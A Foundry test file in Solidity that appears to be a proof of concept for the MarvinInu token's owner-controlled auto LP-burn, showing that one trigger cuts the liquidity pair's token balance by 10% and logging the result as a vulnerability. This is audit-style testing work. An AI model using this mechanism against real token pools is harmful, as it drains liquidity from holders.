// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MarvinInu.sol";

contract MarvinInuLPBurnTest is Test {
    MarvinInu token;
    address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH = address(0x1111);
    address constant FACTORY = address(0x2222);
    address constant PAIR = address(0xABCD);
    
    address owner = address(this);
    address user = address(1);
    uint256 constant INITIAL_LP_BALANCE = 100_000 * 1e18;

    function setUp() public {
        // Mock router/factory responses
        vm.mockCall(
            ROUTER, 
            abi.encodeWithSignature("factory()"), 
            abi.encode(FACTORY)
        );
        vm.mockCall(
            ROUTER,
            abi.encodeWithSignature("WETH()"),
            abi.encode(WETH)
        );
        vm.mockCall(
            FACTORY, 
            abi.encodeWithSignature("createPair(address,address)"), 
            abi.encode(PAIR)
        );
        vm.mockCall(
            PAIR, 
            abi.encodeWithSignature("sync()"), 
            ""
        );
        
        // Deploy token
        vm.startPrank(owner);
        token = new MarvinInu();
        token.enableTrading();
        token.removeLimits(); // Disable transaction limits
        vm.stopPrank();

        // Setup initial token distribution
        deal(address(token), PAIR, INITIAL_LP_BALANCE, true);
        deal(address(token), user, 1);
    }

    function test_BurnDramaticallyReducesLiquidity() public {
        console2.log("--- BEFORE-Trigger LP Balance---");
        // Record initial balance
        uint256 initialLPBalance = token.balanceOf(PAIR);
        require(initialLPBalance == INITIAL_LP_BALANCE, "Incorrect initial LP balance");
        console2.log("Balance of LP: %s", initialLPBalance);
        
        console2.log("--- Trigger AutoLPBurn ---");
        // Enable 10% LP burn
        vm.prank(owner);
        token.setAutoLPBurnSettings(600, 1000, true); // Enable 10% burn
        
        // Advance past burn interval
        vm.warp(block.timestamp + 601);
        
        // Trigger transfer to pair (activates burn)
        vm.prank(user);
        token.transfer(PAIR, 1); // Burns 10% + adds 1 token to LP
        
        console2.log("--- AFTER-Trigger LP Balance---");
        // Verify results
        uint256 finalLPBalance = token.balanceOf(PAIR);
        console2.log("Balance of LP: %s", finalLPBalance);
        
        // Differential validation: Check if LP balance decreased (indicating successful burn)
        bool balanceDecreased = finalLPBalance < initialLPBalance;
        console2.log("LP balance decreased: %s", balanceDecreased ? "YES" : "NO");
        
        // Final vulnerability verdict based on state change
        if (balanceDecreased) {
            console2.log("Vulnerability Exists: LP balance decreased by 10%% due to disproportionate burn");
        } else {
            console2.log("Vulnerability not Exist: No significant change in LP balance");
        }

        // Original test assertions (kept for completeness)
        uint256 expectedBurnAmount = INITIAL_LP_BALANCE / 10;
        uint256 expectedBalanceAfterBurn = INITIAL_LP_BALANCE - expectedBurnAmount;
        uint256 expectedFinalBalance = expectedBalanceAfterBurn + 1;
        assertEq(finalLPBalance, expectedFinalBalance, "LP balance should reflect burn plus final token transfer");
    }
}